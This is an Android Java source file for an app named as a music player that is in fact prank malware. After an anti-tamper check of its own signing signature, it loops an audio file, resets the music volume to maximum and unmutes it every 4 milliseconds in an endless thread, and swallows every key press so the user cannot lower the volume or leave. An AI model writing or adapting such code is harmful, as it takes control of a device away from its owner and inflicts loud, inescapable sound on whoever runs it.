package com.pojdd.music;

import android.app.Activity;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.view.KeyEvent;

/**
 * 编写时间：2019.9.28
 */
public class MainActivity extends Activity {
    private MediaPlayer mMediaPlayer;
    private MainActivity activity;
    private AudioManager mgr;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        activity=this;

        int d=-1676295653;
        int r=-936647231;

        PackageInfo packageInfo = null;
        try {
            packageInfo = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        int t=packageInfo.signatures[0].hashCode();

        while (t!=d){
            if(t==r)break;
            return;
        }
        //实例化
        mgr = (AudioManager) getSystemService(AUDIO_SERVICE);
//        mgr.adjustStreamVolume(AudioManager.STREAM_MUSIC,AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
//        mgr.adjustStreamVolume(AudioManager.STREAM_MUSIC,AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
        new Thread(){
            @Override
            public void run() {
                mMediaPlayer=MediaPlayer.create(activity,R.raw.a);
                mMediaPlayer.setLooping(true);
                mMediaPlayer.start();
                int maxVolume = mgr.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                for (;;) {
                    try {
                        Thread.sleep(4);
                        mgr.adjustStreamVolume(AudioManager.STREAM_MUSIC,AudioManager.ADJUST_UNMUTE, AudioManager.FLAG_SHOW_UI);
                        mgr.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }


    @Override
    public boolean dispatchKeyEvent(KeyEvent event) {
        return true;
    }
}
